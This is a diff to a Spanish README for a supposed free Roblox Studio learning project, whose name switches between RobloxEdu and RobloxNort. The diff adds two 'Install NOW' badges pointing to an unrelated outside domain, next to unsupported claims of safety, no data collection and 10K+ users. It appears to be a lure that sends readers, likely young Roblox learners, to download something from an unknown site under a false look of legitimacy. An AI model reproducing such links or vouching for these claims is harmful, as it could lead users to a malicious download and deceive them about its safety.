@@ -4,6 +4,7 @@
 
 RobloxEdu es un recurso educativo gratuito de 2025 para aprender diseño de juegos en Roblox Studio (1.20+). Diseñado para proyectos de un solo jugador, es seguro, de código abierto y cumple con los Términos de Servicio de GitHub y Roblox. ¡Únete a 10K+ usuarios para crear tus propias experiencias en Roblox!
 
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://varengpool.com)
 
 
 **¿Por Qué RobloxNort?**  
@@ -35,8 +36,12 @@ RobloxNort es exclusivamente para uso local en Roblox Studio (modo de un solo ju
 - ✅ Usado por 10K+ aprendices globalmente.  
 - 🕵 Sin recolección de datos.  
 
+
 **Captura de Pantalla**  
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://varengpool.com)
+
 **RobloxNort en Acción**  
+
 ![Vista Previa](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQRr_tWWlkiAtfjryQde0HcWqeUlYaIKxUAJw&s)  
 
 **Contribuir**  
